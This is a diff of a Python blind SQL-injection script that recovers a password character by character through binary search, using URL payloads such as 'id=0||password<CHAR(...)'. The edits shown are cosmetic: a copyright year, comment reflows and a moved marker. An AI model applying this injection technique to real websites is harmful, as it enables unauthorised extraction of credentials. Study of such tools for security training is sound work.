@@ -14,7 +14,7 @@
 #  You should have received a copy of the GNU General Public License
 #  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
-#  Copyright 2012 Yannick Méheut <useless (at) utouch (dot) fr>
+#  Copyright 2013 Yannick Méheut <useless (at) utouch (dot) fr>
 
 import sys
 import requests
@@ -39,8 +39,8 @@ def injection(target_url, authorized_characters, string_when_success, length):
 	while (len(password) < length):
 		# Parameters for the binary search
 		a, b = 0, len(authorized_characters) - 1
-		# old_c is used, cause we can't performan usual
-		# binary search (we can't test the equality)
+		# old_c is used, cause we can't performan usual binary search 
+        # (we can't test the equality)
 		c, old_c = 0, 0
 
 		# We perform a binary search to find the right character
@@ -64,13 +64,13 @@ def injection(target_url, authorized_characters, string_when_success, length):
 				separator = '?'
 			url = target_url + separator + 'id=0||password<CHAR({0}{1})'
 			url = url.format(ascii_password, ord(tested_character))
-			#### END OF CHANGE
 
 			r = requests.get(url)
+			#### END OF CHANGE
+
 			output = r.text
 
-			# We seek which half of authorized_characters
-			# we should search in
+			# We seek which half of authorized_characters we should search in
 			if string_when_success in output:
 				b = c - 1
 			else:
